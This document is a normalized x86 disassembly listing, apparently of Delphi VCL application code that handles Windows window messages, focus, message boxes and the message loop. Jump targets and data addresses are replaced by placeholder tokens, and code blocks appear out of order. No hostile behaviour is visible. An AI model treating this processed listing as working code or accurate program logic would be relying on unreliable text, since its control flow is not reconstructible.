cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e25c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45d010
push ebp
call sub_45dad0
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45dad0
pop ecx
jmp [ eax * 4 + jump_table_45dbfc ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4446f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45e610
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4490b4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45da64
push ebp
call sub_45dad0
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45dad0
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45dad0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_4191e0
jmp r-xdata
xor eax eax
call sub_455890
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4446f8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_43f0c4
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e278
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45dad0
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45b210
jmp r-xdata
push ebp
call sub_45dad0
pop ecx
jmp r-xdata
push ebp
call sub_45db0c
pop ecx
jmp r-xdata
push ebp
call sub_45dad0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d970
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e328
jmp r-xdata
jmp r-xdata
call sub_42f650
call sub_42f730
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d960
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d970
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d968
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_455740
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45dad0
pop ecx
jmp r-xdata
call sub_4557f4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45dad0
pop ecx
jmp r-xdata
call sub_42f650
call sub_42f78c
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40ce4c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45e278
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45d960
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45d290
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4446f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4446f8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45e328
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45d290
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4446f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45d970
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4446f8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_458f9c
mov eax [ ebx + 0x44 ]
call sub_45b3b8
sub_45e428
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45e464
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_404010
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_4040ac
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45e4b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45e4d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45e524
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43ad50
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4446f8
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45e5dc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45f53c
sub_45e610
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4446f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403468
test al al
jne r-xdata
sub_45e67c
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45e5dc
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45e4d4
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45e524
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45e4b0
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45e714
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45e67c
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45efe4
sub_45e738
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_4139a8
mov eax 0x8
call sub_4026bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_41386c
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45e794
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4139c8
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026dc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4138b8
jmp r-xdata
sub_45e828
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_40370c#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4446d4
mov [ esi + 0x44 ] edi
sub_45e8a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45e986
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_4556b8
call sub_407b14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e98d
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_458f9c
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_40370c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45e714
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_457ea4
mov eax [ ebp - 0x4 ]
call sub_45e278
jmp r-xdata
sub_45e9a8
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40274c
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40276c
push eax
call sub_40274c
pop edx
call sub_40b34c
call sub_40274c
mov edx [ rw-data ]
call sub_4033f8
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40274c
mov edx eax
mov eax ebx
call sub_45eba0
pop esi
pop ebx
retn
call sub_40274c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45ea38
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_455740
mov [ ebp - 0x10 ] eax
call sub_45565c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45d9dc
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45eb8d
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eb94
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_4557f4
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_455664
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45eba0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ec5b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404054
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45e464
mov eax [ ebp - 0x108 ]
call sub_40447c
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
mov edx eax
mov eax ebx
pop ecx
call sub_45ea38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ec62
lea eax [ ebp - 0x108 ]
call sub_403fbc
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
call sub_40831c
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d7c
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b94
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404284
sub_45ec78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_444894
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_4449fc
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_45f31c
test al al
je r-xdata
call sub_4446f8
mov ebp eax
mov eax edi
call sub_4446f8
mov ebp eax
mov eax esi
call sub_45f31c
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45ede0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45ee38
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45f31c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45fb68
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee3f
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_45ee48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45eea0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45f31c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45fb68
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eea7
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_45eeb8
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_40326c
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43e064
jmp r-xdata
sub_45ef08
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45c4b4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4446f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45c4a0
mov ebx eax
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov eax ebx
call sub_4446f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45ef6c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43c770
mov edi eax
call sub_43b06c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43f0c4
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43f0c4
sub_45efe4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45f0f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45ef6c
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45d01c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43afd4
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_45f1a4
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_45f09b
push [ fs : eax ]
mov [ fs : eax ] esp
